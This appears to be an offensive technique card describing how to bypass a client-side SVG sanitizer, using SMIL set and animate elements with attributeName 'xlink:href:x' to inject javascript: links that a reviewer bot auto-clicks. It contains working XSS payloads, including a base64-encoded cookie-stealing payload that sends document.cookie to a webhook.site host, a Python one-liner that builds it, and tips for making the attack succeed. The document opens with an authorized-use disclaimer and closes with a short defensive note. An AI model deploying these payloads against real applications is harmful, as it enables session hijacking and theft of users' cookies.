# SVG SMIL xlink:href:x Sanitizer Bypass

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when:

- a client-side sanitizer allows SVG `animate` / `set` elements
- animation elements are removed only when `attributeName` is exactly `href` or `xlink:href`
- direct `href="javascript:..."` is stripped
- a preview or reviewer bot auto-clicks the first link

## Minimal Execution Payload

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink">
  <a id="foo" xlink:href="https://example.com">
    <text x="20" y="20">click</text>
  </a>
  <set href="#foo" attributeName="xlink:href:x" to="javascript:alert(1)"></set>
</svg>
```

## Cookie Exfil Payload

```html
<svg xmlns:xlink="http://www.w3.org/1999/xlink">
  <a id="foo" xlink:href="https://example.com">
    <text x="20" y="20">click</text>
  </a>
  <set href="#foo" attributeName="xlink:href:x" to="javascript:eval(atob('[BASE64]'))"></set>
</svg>
```

Generate `[BASE64]`:

```bash
python3 -c "import base64; print(base64.b64encode(b\"fetch('https://webhook.site/[UUID]?c='+encodeURIComponent(document.cookie))\").decode())"
```

Decoded primitive:

```javascript
fetch('https://webhook.site/[UUID]?c='+encodeURIComponent(document.cookie))
```

## Alternate Animation Primitive

```html
<animate href="#foo"
         attributeName="xlink:href:x"
         values="javascript:eval(atob('[BASE64]'))"
         begin="0s"
         dur="1s"
         fill="freeze"></animate>
```

Prefer `<set>` when you need the href rewritten before the bot clicks at a fixed timeout.

## Why It Works

1. The sanitizer blocks only exact `attributeName` values `href` and `xlink:href`.
2. `xlink:href:x` survives because of string-comparison parser differential.
3. SMIL rewrites the SVG link to `javascript:` after sanitization.
4. Auto-link activation executes the payload in the reviewer browser.

## Why It Fails

- Sanitizer parses `attributeName` with SVG-aware logic.
- Animation elements are denied entirely.
- Bot does not auto-click links.
- The first `<a>` in the document is a decoy you do not control.
- Reviewer cookies are `HttpOnly` and no in-origin exfil path exists.

## Common Mistakes

- Using `attributeName="HREF"` or `href:x` on HTML anchors instead of `xlink:href:x` on SVG links.
- Reusing Pillbox form-action payloads on a build that denies forms.
- Putting the exploit link second when the bot clicks only the first `<a>`.
- Storing live flags, webhook UUIDs, or reviewer cookies in reusable payload files.

## Defensive Note

Exact string checks on SVG `attributeName` are fragile. Treat SMIL as a post-sanitization mutation primitive and block any animation that can rewrite navigation attributes.
